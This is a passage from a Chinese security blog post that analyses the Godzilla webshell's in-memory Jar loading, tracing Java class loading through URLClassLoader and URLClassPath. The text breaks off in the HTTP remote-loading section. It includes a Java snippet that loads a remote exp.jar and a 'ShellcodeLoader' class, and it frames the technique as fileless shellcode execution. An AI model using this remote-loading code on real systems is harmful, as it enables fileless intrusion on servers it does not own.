@@ -1,0 +1,718 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>分析哥斯拉内存加载Jar技术 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="分析哥斯拉内存加载Jar技术" />
+<meta property="og:description" content="1 背景哥斯拉在第一版的时候就提供了一个黑魔法：内存加载Jar功能。从当时的介绍来看，这个功能本来是为上传数据库驱动用的，后面配合JNA可以实" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/memory-jarloader/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-09T20:25:03+08:00" />
+<meta property="article:modified_time" content="2023-10-09T20:25:03+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="分析哥斯拉内存加载Jar技术"/>
+<meta name="twitter:description" content="1 背景哥斯拉在第一版的时候就提供了一个黑魔法：内存加载Jar功能。从当时的介绍来看，这个功能本来是为上传数据库驱动用的，后面配合JNA可以实"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/memory-jarloader/" /><link rel="prev" href="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/" /><link rel="next" href="https://yzddmr6.com/posts/gzh/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "分析哥斯拉内存加载Jar技术",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/memory-jarloader\/"
+        },"genre": "posts","wordcount":  4160 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/memory-jarloader\/","datePublished": "2023-10-09T20:25:03+08:00","dateModified": "2023-10-09T20:25:03+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#findresource流程分析">findResource流程分析</a></li>
+    <li><a href="#urlclasspath与url">URLClassPath与URL</a></li>
+    <li><a href="#http远程加载jar包原理">HTTP远程加载Jar包原理</a></li>
+    <li><a href="#内存加载jar原理">内存加载Jar原理</a>
+      <ul>
+        <li><a href="#增加自定义protocol">增加自定义protocol</a></li>
+        <li><a href="#实现自定义urlstreamhandler">实现自定义URLStreamHandler</a></li>
+        <li><a href="#实现自定义urlconnection">实现自定义URLConnection</a></li>
+        <li><a href="#添加到systemclassloader的ucp中">添加到SystemClassLoader的ucp中</a></li>
+        <li><a href="#files对象">files对象</a></li>
+      </ul>
+    </li>
+    <li><a href="#适配高版本jdk">适配高版本JDK</a></li>
+    <li><a href="#as-exploits内存加载shellcode">As-Exploits内存加载ShellCode</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">分析哥斯拉内存加载Jar技术</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-10-09">2023-10-09</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-10-09">2023-10-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4160 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 9 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#findresource流程分析">findResource流程分析</a></li>
+    <li><a href="#urlclasspath与url">URLClassPath与URL</a></li>
+    <li><a href="#http远程加载jar包原理">HTTP远程加载Jar包原理</a></li>
+    <li><a href="#内存加载jar原理">内存加载Jar原理</a>
+      <ul>
+        <li><a href="#增加自定义protocol">增加自定义protocol</a></li>
+        <li><a href="#实现自定义urlstreamhandler">实现自定义URLStreamHandler</a></li>
+        <li><a href="#实现自定义urlconnection">实现自定义URLConnection</a></li>
+        <li><a href="#添加到systemclassloader的ucp中">添加到SystemClassLoader的ucp中</a></li>
+        <li><a href="#files对象">files对象</a></li>
+      </ul>
+    </li>
+    <li><a href="#适配高版本jdk">适配高版本JDK</a></li>
+    <li><a href="#as-exploits内存加载shellcode">As-Exploits内存加载ShellCode</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="背景" class="headerLink">
+    <a href="#%e8%83%8c%e6%99%af" class="header-mark"></a>1 背景</h2><p>哥斯拉在第一版的时候就提供了一个黑魔法：内存加载Jar功能。从当时的介绍来看，这个功能本来是为上传数据库驱动用的，后面配合JNA可以实现无文件加载ShellCode，一切都在内存中执行，大大扩展了利用面。</p>
+<p>要知道JDK默认没有提供直接内存加载Jar的接口，但是我们可以想到，既然JDK是支持通过http/file协议加载Jar包，也就是这里面一定存在着：读取Jar包内容-&gt;加载到内存-&gt;defineClass的链路，如果我们能够把第一步跳过去，直接把Jar的byte复制到内存中，就可以实现无文件加载。同样，Java原生是不支持内存加载so或者dll的，但是我们可以通过内存加载Jar的方式，在Jar中包含我们要利用的so/dll即可实现曲线救国。</p>
+<p>As-Exploits很早就把这个功能移植了过来，不过目前似乎并没有找到有写分析这个功能的文章，本文抛砖引玉，简单分析分析。</p>
+<h2 id="findresource流程分析" class="headerLink">
+    <a href="#findresource%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90" class="header-mark"></a>2 findResource流程分析</h2><p>在了解无文件加载Jar原理之前，首先了解一下JVM是如何查找Class的
+Class.forName后下一个断点，进入java.net.URLClassLoader#findClass，这里有一个很重要的属性ucp，包含了所有的URL实例
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694917795837-c229294b-c7e0-4017-a012-3c9a99966748.png#averageHue=%23f2f0ef&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=568&amp;id=u46d6481a&amp;originHeight=1136&amp;originWidth=2102&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1355616&amp;status=done&amp;style=none&amp;taskId=u97f95d6b-7b84-4530-a6dc-95f773b3d66&amp;title=&amp;width=1051" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694917795837-c229294b-c7e0-4017-a012-3c9a99966748.png#averageHue=%23f2f0ef&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=568&amp;id=u46d6481a&amp;originHeight=1136&amp;originWidth=2102&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1355616&amp;status=done&amp;style=none&amp;taskId=u97f95d6b-7b84-4530-a6dc-95f773b3d66&amp;title=&amp;width=1051">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694917795837-c229294b-c7e0-4017-a012-3c9a99966748.png#averageHue=%23f2f0ef&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=568&amp;id=u46d6481a&amp;originHeight=1136&amp;originWidth=2102&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1355616&amp;status=done&amp;style=none&amp;taskId=u97f95d6b-7b84-4530-a6dc-95f773b3d66&amp;title=&amp;width=1051"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694917795837-c229294b-c7e0-4017-a012-3c9a99966748.png#averageHue=%23f2f0ef&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=568&amp;id=u46d6481a&amp;originHeight=1136&amp;originWidth=2102&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1355616&amp;status=done&amp;style=none&amp;taskId=u97f95d6b-7b84-4530-a6dc-95f773b3d66&amp;title=&amp;width=1051, https://cdn.nlark.com/yuque/0/2023/png/1599908/1694917795837-c229294b-c7e0-4017-a012-3c9a99966748.png#averageHue=%23f2f0ef&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=568&amp;id=u46d6481a&amp;originHeight=1136&amp;originWidth=2102&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1355616&amp;status=done&amp;style=none&amp;taskId=u97f95d6b-7b84-4530-a6dc-95f773b3d66&amp;title=&amp;width=1051 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1694917795837-c229294b-c7e0-4017-a012-3c9a99966748.png#averageHue=%23f2f0ef&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=568&amp;id=u46d6481a&amp;originHeight=1136&amp;originWidth=2102&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1355616&amp;status=done&amp;style=none&amp;taskId=u97f95d6b-7b84-4530-a6dc-95f773b3d66&amp;title=&amp;width=1051 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure>
+然后会通过ClassLoader中的ucp属性尝试获取目标类的Resource，这里调用的是sun.misc.URLClassPath#getResource(java.lang.String, boolean)，主要逻辑为遍历ucp下所有的URL对象进行资源的查找：sun.misc.URLClassPath.JarLoader#getResource(java.lang.String, boolean)
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694918194842-36d84d25-18d0-4df1-a369-1266eb35b376.png#averageHue=%23fbfbfb&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=412&amp;id=ubfe1106e&amp;originHeight=824&amp;originWidth=1434&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=533439&amp;status=done&amp;style=none&amp;taskId=u29d62082-3921-443b-b7a0-00087943902&amp;title=&amp;width=717" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694918194842-36d84d25-18d0-4df1-a369-1266eb35b376.png#averageHue=%23fbfbfb&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=412&amp;id=ubfe1106e&amp;originHeight=824&amp;originWidth=1434&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=533439&amp;status=done&amp;style=none&amp;taskId=u29d62082-3921-443b-b7a0-00087943902&amp;title=&amp;width=717">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694918194842-36d84d25-18d0-4df1-a369-1266eb35b376.png#averageHue=%23fbfbfb&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=412&amp;id=ubfe1106e&amp;originHeight=824&amp;originWidth=1434&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=533439&amp;status=done&amp;style=none&amp;taskId=u29d62082-3921-443b-b7a0-00087943902&amp;title=&amp;width=717"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694918194842-36d84d25-18d0-4df1-a369-1266eb35b376.png#averageHue=%23fbfbfb&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=412&amp;id=ubfe1106e&amp;originHeight=824&amp;originWidth=1434&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=533439&amp;status=done&amp;style=none&amp;taskId=u29d62082-3921-443b-b7a0-00087943902&amp;title=&amp;width=717, https://cdn.nlark.com/yuque/0/2023/png/1599908/1694918194842-36d84d25-18d0-4df1-a369-1266eb35b376.png#averageHue=%23fbfbfb&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=412&amp;id=ubfe1106e&amp;originHeight=824&amp;originWidth=1434&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=533439&amp;status=done&amp;style=none&amp;taskId=u29d62082-3921-443b-b7a0-00087943902&amp;title=&amp;width=717 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1694918194842-36d84d25-18d0-4df1-a369-1266eb35b376.png#averageHue=%23fbfbfb&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=412&amp;id=ubfe1106e&amp;originHeight=824&amp;originWidth=1434&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=533439&amp;status=done&amp;style=none&amp;taskId=u29d62082-3921-443b-b7a0-00087943902&amp;title=&amp;width=717 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>找到目标Class对应所在Resource对象后，则会走入java.net.URLClassLoader#defineClass方法，进行类的加载
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694919723701-64cc134e-fa54-4319-bf51-6bff256ed215.png#averageHue=%23f9f7f6&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=609&amp;id=u714accb0&amp;originHeight=1218&amp;originWidth=1914&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1303337&amp;status=done&amp;style=none&amp;taskId=ua779053c-5e9b-4965-a303-4fdfb91d805&amp;title=&amp;width=957" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694919723701-64cc134e-fa54-4319-bf51-6bff256ed215.png#averageHue=%23f9f7f6&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=609&amp;id=u714accb0&amp;originHeight=1218&amp;originWidth=1914&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1303337&amp;status=done&amp;style=none&amp;taskId=ua779053c-5e9b-4965-a303-4fdfb91d805&amp;title=&amp;width=957">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694919723701-64cc134e-fa54-4319-bf51-6bff256ed215.png#averageHue=%23f9f7f6&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=609&amp;id=u714accb0&amp;originHeight=1218&amp;originWidth=1914&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1303337&amp;status=done&amp;style=none&amp;taskId=ua779053c-5e9b-4965-a303-4fdfb91d805&amp;title=&amp;width=957"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1694919723701-64cc134e-fa54-4319-bf51-6bff256ed215.png#averageHue=%23f9f7f6&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=609&amp;id=u714accb0&amp;originHeight=1218&amp;originWidth=1914&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1303337&amp;status=done&amp;style=none&amp;taskId=ua779053c-5e9b-4965-a303-4fdfb91d805&amp;title=&amp;width=957, https://cdn.nlark.com/yuque/0/2023/png/1599908/1694919723701-64cc134e-fa54-4319-bf51-6bff256ed215.png#averageHue=%23f9f7f6&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=609&amp;id=u714accb0&amp;originHeight=1218&amp;originWidth=1914&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1303337&amp;status=done&amp;style=none&amp;taskId=ua779053c-5e9b-4965-a303-4fdfb91d805&amp;title=&amp;width=957 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1694919723701-64cc134e-fa54-4319-bf51-6bff256ed215.png#averageHue=%23f9f7f6&amp;clientId=u0951b4c9-cea3-4&amp;from=paste&amp;height=609&amp;id=u714accb0&amp;originHeight=1218&amp;originWidth=1914&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1303337&amp;status=done&amp;style=none&amp;taskId=ua779053c-5e9b-4965-a303-4fdfb91d805&amp;title=&amp;width=957 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<h2 id="urlclasspath与url" class="headerLink">
+    <a href="#urlclasspath%e4%b8%8eurl" class="header-mark"></a>3 URLClassPath与URL</h2><p>上面的过程涉及到两个重要的类，直接贴一下ChatGPT的描述：
+sun.misc.URLClassPath类和java.net.URL类在Java中都与URL（统一资源定位符）相关联，但它们的作用和职责不同。</p>
+<p>java.net.URL类是Java标准库中的一个类，用于表示一个统一资源定位符。它提供了许多方法来解析、构建和处理URL。URL对象可以用于打开连接、获取流等操作，以访问网络资源。</p>
+<p>sun.misc.URLClassPath类是Java虚拟机（JVM）的一部分，并不属于公共API，它被用于支持类加载器加载和查找类文件。在类的查找过程中，URLClassPath负责管理类加载路径、查找类文件并加载类。</p>
+<p>具体来说，当Java程序运行时，JVM的类加载器负责根据类的名称来查找并加载相应的类文件。URLClassPath类是JVM中的一个关键组件，它通过封装一组URL对象（其中包含了可能包含类文件的目录或JAR文件的URL）来提供类的查找功能。URLClassPath通过调用java.net.URL类提供的方法来解析和构建URL对象，并利用这些URL对象来定位和加载类文件。</p>
+<p>因此，可以说URLClassPath类是在类加载过程中起着重要的作用，它与java.net.URL类密切合作，使用URL来定位并加载类文件。</p>
+<h2 id="http远程加载jar包原理" class="headerLink">
+    <a href="#http%e8%bf%9c%e7%a8%8b%e5%8a%a0%e8%bd%bdjar%e5%8c%85%e5%8e%9f%e7%90%86" class="header-mark"></a>4 HTTP远程加载Jar包原理</h2><p>知道了findResource的原理，后面就好理解为什么下面的的代码可以远程加载一个Jar包了：实际上就是把我们自定义的远程URL加入到了ucp属性中，后续通过该URL中提供的协议进行类的查找</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">URLClassLoader loader = new URLClassLoader(new URL[]{new URL(&#34;http://yzddmr6.com/exp.jar&#34;)});
+</span></span><span class="line"><span class="cl">loader.loadClass(&#34;asexploits.ShellcodeLoader&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为了摸清这一过程，我们用上面的代码对http协议加载Jar包过程进行调试：
+在java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)断点，发现会根据获取到的协议方式拿到不同的handler，例如http://yzddmr6.com/exp.jar，就会获取http的handler，file:///tmp/exp.jar就会获取file类型的hander
+java.net.URL#getURLStreamHandler
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716083244-7b1991b1-a19d-4e6e-9d9e-5c8d723cc48b.png#averageHue=%23f8f8f7&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=281&amp;id=ub031aefa&amp;originHeight=562&amp;originWidth=1376&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=406999&amp;status=done&amp;style=none&amp;taskId=u4e6dccca-8e76-4a94-9ae7-8ca097daba5&amp;title=&amp;width=688" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716083244-7b1991b1-a19d-4e6e-9d9e-5c8d723cc48b.png#averageHue=%23f8f8f7&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=281&amp;id=ub031aefa&amp;originHeight=562&amp;originWidth=1376&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=406999&amp;status=done&amp;style=none&amp;taskId=u4e6dccca-8e76-4a94-9ae7-8ca097daba5&amp;title=&amp;width=688">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716083244-7b1991b1-a19d-4e6e-9d9e-5c8d723cc48b.png#averageHue=%23f8f8f7&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=281&amp;id=ub031aefa&amp;originHeight=562&amp;originWidth=1376&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=406999&amp;status=done&amp;style=none&amp;taskId=u4e6dccca-8e76-4a94-9ae7-8ca097daba5&amp;title=&amp;width=688"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716083244-7b1991b1-a19d-4e6e-9d9e-5c8d723cc48b.png#averageHue=%23f8f8f7&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=281&amp;id=ub031aefa&amp;originHeight=562&amp;originWidth=1376&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=406999&amp;status=done&amp;style=none&amp;taskId=u4e6dccca-8e76-4a94-9ae7-8ca097daba5&amp;title=&amp;width=688, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716083244-7b1991b1-a19d-4e6e-9d9e-5c8d723cc48b.png#averageHue=%23f8f8f7&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=281&amp;id=ub031aefa&amp;originHeight=562&amp;originWidth=1376&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=406999&amp;status=done&amp;style=none&amp;taskId=u4e6dccca-8e76-4a94-9ae7-8ca097daba5&amp;title=&amp;width=688 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716083244-7b1991b1-a19d-4e6e-9d9e-5c8d723cc48b.png#averageHue=%23f8f8f7&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=281&amp;id=ub031aefa&amp;originHeight=562&amp;originWidth=1376&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=406999&amp;status=done&amp;style=none&amp;taskId=u4e6dccca-8e76-4a94-9ae7-8ca097daba5&amp;title=&amp;width=688 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure>
+之前查找到的hander会被保存到handlers整个缓存中，如果没有就会进行一个包名的拼接: &ldquo;sun.net.www.protocol&rdquo;+protocol+&quot;.Handler&quot;，找到对应的处理类
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716144135-94fe472d-bd6b-4300-9f58-3d869e9d8e36.png#averageHue=%23faf9f9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=717&amp;id=u1724cb75&amp;originHeight=1434&amp;originWidth=2176&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1393027&amp;status=done&amp;style=none&amp;taskId=ua85e48ba-578a-4792-a6eb-69a1777de52&amp;title=&amp;width=1088" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716144135-94fe472d-bd6b-4300-9f58-3d869e9d8e36.png#averageHue=%23faf9f9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=717&amp;id=u1724cb75&amp;originHeight=1434&amp;originWidth=2176&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1393027&amp;status=done&amp;style=none&amp;taskId=ua85e48ba-578a-4792-a6eb-69a1777de52&amp;title=&amp;width=1088">
+        <img
+            
+            loading="lazy"
